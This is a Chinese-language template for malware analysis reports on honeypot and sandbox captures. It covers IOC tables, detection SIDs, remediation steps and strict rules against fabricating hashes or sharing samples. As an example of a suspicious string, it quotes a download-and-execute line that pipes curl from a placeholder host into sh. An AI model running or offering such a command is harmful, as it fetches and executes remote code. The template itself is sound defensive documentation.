# 恶意样本分析报告模板

> 用途：蜜罐/沙箱捕获到样本后，按本模板产出**可复核、可检索、可处置**的分析报告。
> 原则：**只写证据能支撑的结论**；拿不到的字段写「取不到」并注明原因，禁止猜测、禁止编造 hash。
> 红线：**不复制样本本体、不上传样本、不提供任何下载链接**；报告里只出现 hash、元数据、行为与 IOC。

---

## 0. 报告元数据

| 字段 | 内容 |
|---|---|
| 报告编号 | `SA-YYYYMMDD-序号` |
| 分析日期 | `YYYY-MM-DD`（UTC） |
| 分析人 | |
| 数据来源 | 例如 srv2 /opt/dionaea、/opt/cowrie、Suricata eve.json |
| 捕获时间窗 | `YYYY-MM-DDTHH:MM:SSZ ~ ...` |
| 关联事件 | 威胁评分排名、告警 SID、工单号 |
| 样本状态 | 已捕获 / 未捕获（未捕获时第 1–4 节写「取不到」） |

---

## 1. 样本标识

| 字段 | 值 | 证据 |
|---|---|---|
| SHA-256 | `<hash 或 取不到>` | 数据库/文件路径 + 查询命令 |
| MD5 | `<hash 或 取不到>` | 同上 |
| 文件大小 | `<bytes 或 取不到>` | 同上 |
| 文件类型 | `<ELF/PE/脚本/... 或 取不到>` | `file` 输出或魔数 |
| 首次发现 | `YYYY-MM-DDTHH:MM:SSZ` | 蜜罐事件时间戳 |

要求：
- hash 必须来自真实文件或样本库字段（如 Dionaea `downloads.download_md5_hash`、`virustotals.virustotal_md5_hash`），**不得从文件名或 URL 推断**。
- 三者任一缺失，明确写「取不到」，并说明是目录为空、表 0 行还是权限不足。

---

## 2. 落地路径

| 字段 | 值 |
|---|---|
| 蜜罐侧保存路径 | `<容器内路径 或 取不到>` |
| 宿主机映射路径 | `<... 或 取不到>` |
| 写入方式 | HTTP 下载 / FTP / TFTP / SMB / 其他 |
| 文件权限/属主 | `<... 或 取不到>` |

核查命令示例（只读）：

```bash
sudo -n ls -la /opt/dionaea/var/lib/dionaea/binaries
sudo -n python3 - <<'PY'
import sqlite3
con = sqlite3.connect("file:/opt/dionaea/var/lib/dionaea/dionaea.sqlite?mode=ro", uri=True)
print("downloads:", con.execute("select count(*) from downloads").fetchone()[0])
PY
```

---

## 3. 触发 URL

| 字段 | 值 |
|---|---|
| 下载 URL | `<url 或 取不到>` |
| 请求方法 / Host | `<GET/POST / host 或 取不到>` |
| 首次请求时间 | `<... 或 取不到>` |
| 关联源 IP | `<ip>` |

要求：
- URL 只记录**观测到的字符串**，不补全、不拼接；URL 中的域名/路径可直接进 IOC。
- 报告内**不得**把 URL 写成可点击下载链接，不得附样本附件。

---

## 4. 静态特征（`strings` 里的可疑项）

无样本时写「取不到，未捕获二进制，无法执行 strings」，并转而记录**协议层特征**。有样本时至少覆盖：

| 类别 | 关注点 | 本次结果 |
|---|---|---|
| 网络 | 硬编码 IP/域名/URL、User-Agent、C2 路径 | |
| 持久化 | systemd/cron/rc.local/注册表/启动项 | |
| 执行 | shell 命令、`curl / wget / chmod +x`、base64 解码 | |
| 规避 | 反调试、休眠、环境检测、加密字符串 | |
| 凭据 | 内置用户名/口令、SSH key、token | |

记录格式：`偏移/字符串/为什么可疑`，例如：

```
0x0001a2b0  /bin/sh -c curl -fsSL http://x/y.sh|sh   下载即执行
0x0002c410  SSH-2.0-Go                                Go 编写的扫描/爆破客户端
```

---

## 5. IOC 列表

| 类型 | 值 | 置信度 | 说明 |
|---|---|---|---|
| IPv4 | | 高/中/低 | 源 IP、C2、下载服务器 |
| 域名 | | | |
| URL | | | 只写路径，不给可点击链接 |
| 端口/协议 | | | 例如 2222/tcp SSH、1433/tcp MSSQL |
| 文件 hash | | | SHA-256/MD5 |
| 凭据 | `user/pass` | | 攻击者使用的字典口令 |
| 签名 | SID + 名称 | | Suricata/Wazuh |

IOC 使用建议：IP/域名可直接下发封禁；凭据类 IOC 只用于检测，不要拿去登录任何系统。

---

## 6. 检测建议（对应 SID）

| SID | 规则名/来源 | 命中依据 | 建议动作 | 已知误报 |
|---|---|---|---|---|
| 1000101 | xk-lab：SSH banner `Go` | | 标记 Go 爆破工具链 | 自研巡检脚本 |
| 1000102 | xk-lab：SSH banner `libssh` | | 与 1000103 合流封禁 | 合规扫描器 |
| 1000103 | xk-lab：同源 300s ≥20 SYN 到 2222 | | 临时封禁 + 战报 | 内部自查、蜜罐重连 |
| 1000104 | xk-lab：同源 60s ≥6 SYN 到蜜罐端口组 | | 判横向探测 | 背景测绘 |
| 1000105 | xk-lab：HTTP `.env`/`.git` 探测 | | 封源 + 查站点是否真泄露 | CI 存在性校验 |
| 1000106 | xk-lab：扫描器 UA | | 只打标，不作封禁依据 | 安全团队自测 |
| 1000107 | xk-lab：外部源直连 DB 端口 | | 直接封源 | 云厂商端口探活 |
| 100400 | Wazuh：同源 300s ≥20 会话 | | 提级 10 | 实验室自查 |
| 100401 | Wazuh：同源 60s ≥4 个不同蜜罐端口 | | 提级 12 | Docker 网关 |
| 100402 | Wazuh：蜜罐 MSSQL 收到凭据 | | 提级 12，已进入猜口令阶段 | 连通性自测 |

要求：
- 每条建议都写清「为什么这条 SID 会命中/不会命中」，并注明规则**是否已部署**；未部署的只能写「建议部署后观察」。
- 引用 ET/Wazuh 原生 SID 时写全称，避免与本地 `1000101–1000108` 混淆。

---

## 7. 处置建议

按「止血 → 排查 → 加固 → 复盘」四段写，每段给可执行动作与责任人：

1. **止血**：边界封禁 IOC IP/域名（建议 30 天）；对命中 1000103/100400 的源限速。
2. **排查**：确认是否只有蜜罐命中；核查真实主机同端口、同凭据的登录记录；检查是否有样本落地。
3. **加固**：SSH 改密钥登录、禁用口令；数据库端口不对公网；蜜罐端口变更并保留诱饵。
4. **复盘**：更新检测规则阈值、补充 IOC、记录误报；样本按红线处置（不复制、不外传）。

---

## 附录 A：证据最小集（每次分析都要留）

```bash
# 1) 样本目录
sudo -n ls -la /opt/dionaea/var/lib/dionaea/binaries
# 2) 下载记录（hash 字段）；srv2 无 sqlite3 CLI，用 Python 只读连接
sudo -n python3 - <<'PY'
import sqlite3
con = sqlite3.connect("file:/opt/dionaea/var/lib/dionaea/dionaea.sqlite?mode=ro", uri=True)
print(con.execute("select count(*), count(download_md5_hash) from downloads").fetchone())
print(con.execute("select remote_host,count(*) from connections group by 1 order by 2 desc limit 10").fetchall())
PY
# 3) 告警
grep '"event_type":"alert"' /opt/suricata/logs/eve.json | grep '<ip>' | wc -l
```

## 附录 B：写作红线

- 不复制样本本体、不在仓库/报告内附带二进制、不生成下载链接。
- 不编造 hash、大小、文件类型；拿不到就写「取不到 + 原因」。
- 不把蜜罐里的「登录成功」直接当成真实主机失陷，必须区分蜜罐与生产资产。
- 不泄露真实凭据以外的隐私数据；报告面向内部，发布前脱敏。
